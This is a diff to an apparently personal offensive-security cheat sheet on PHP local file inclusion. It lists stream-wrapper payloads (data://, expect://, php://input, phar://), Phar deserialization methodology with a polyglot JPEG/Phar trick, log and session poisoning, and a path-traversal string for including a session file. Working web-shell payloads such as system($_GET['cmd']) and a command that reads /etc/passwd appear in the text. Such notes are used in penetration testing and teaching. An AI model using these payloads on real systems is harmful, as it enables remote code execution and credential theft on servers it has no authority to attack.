@@ -239,12 +239,32 @@ data://
 =data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
 expect://
+	--not enabled by default
 =expect://id
 =expect://ls
 input://
 =php://input
 POST: <?php system('id'); ?>
+file://
+http://
+	-requires that allow_url_fopen be enabled for outbound connectivity
+ftp://
+	-preferable to http to identify issues since most file operations will work with this wrapper (file writing, stat, unlink, rmdir, mkdir)
+	--set up a server listening on a TCP, then attempt to cause the relevant ftp path to be accessed
+zlib://
+data://
+glob://
 phar://
+	--Phar archives are similar in concept to Java JAR archives, but are tailored to the needs and to the flexibility of PHP applications
+	---used to hold self-extracting or self-contained applications, in the same way that a Jar archive can be executed a Phar archive contains an executable stub containing PHP code
+	--Phar archives can also contain meta-data; meta-data can be any PHP variable that can be serialized
+	--meta-data is unserialized when a Phar archive is first accessed by any(!) file operation
+	--possible unserialization attacks whenever a file operation occurs on a path whose beginning is controlled by an attacker
+	---potentially vulnerable on either direct file operations [file_exists()] and inderact operations, e.g. xml external entity processing (chained xxe exploit)
+	-Methodology:
+		1. Place a valid Phar archive containing the payload object onto the target's local file system
+		2. Trigger a file operation on a "phar://" path referring to the file
+		--identify vuln allowing stage 2 before stage 1
 // create new Phar
 $phar = new Phar('test.phar');
 $phar->startBuffering();
@@ -265,6 +285,23 @@ class AnyClass {
 include('phar://test.phar');
 // If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
 // NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more.
+	Phar File Format elements
+		Stub
+			to act as a self-extracting archive the stub is PHP code executed when the file is accessed in an executable context
+			minimal stub: <?php __HALT_COMPILER();
+		Signature (optional - [required for the archive to be loaded by PHP in default configuration])
+			4 byte "magic" identification value "GBMB", 4 bytes to identify the signature type (MD5, SHA1, SHA256 or SHA512) and the signature itself
+		Meta-data (optional)
+			metadata may contain any serialized PHP object represented in the standard PHP format
+	3 base formats in which Phar archive data may be stored:
+		Phar
+		Tar
+		Zip
+		--Tar format allows the construction of files that are both valid Phar/Tar archives and also valid as other file types
+			---format used is "modern" USTAR
+	-if another file format allows arbitrary data of sufficient length within its first 100 bytes then a file can be constructed which is both valid under the targeted format and a valid Phar/Tar archive
+		--E.g. attack may construct a valid jpeg file that is also a valid Phar archive, because JPEG file format has an arbitrary length description field which is given within the first 100 bytes
+	-If attacker has complete control of a string within the $_SESSION array which occurs within the first 100 bytes we can use a similar technique to cause the session file to be a valid Phar/Tar archive
 
 LFI TO RCE
 /proc/*/fd
@@ -294,6 +331,7 @@ log poisoning
 =/usr/local/apache/log/error_log
 =/usr/local/apache2/log/error_log
 
+
 PHP Sessions (PHPSESSID)
 Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
@@ -304,3 +342,9 @@ user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"adm
 e.g. login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 Exploit LFI to include PHP session file =/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 
+
+Identifying File Path Handling Vulnerabilities
+	treat all file operations as sinks and attempt to find paths from user-controlled data (sources) to these sinks
+		--if we are not able to directly upload files through the target application there are other avenues (e.g. temporary files) we can consider to place full or partially controlled content on the local file system
+
+		
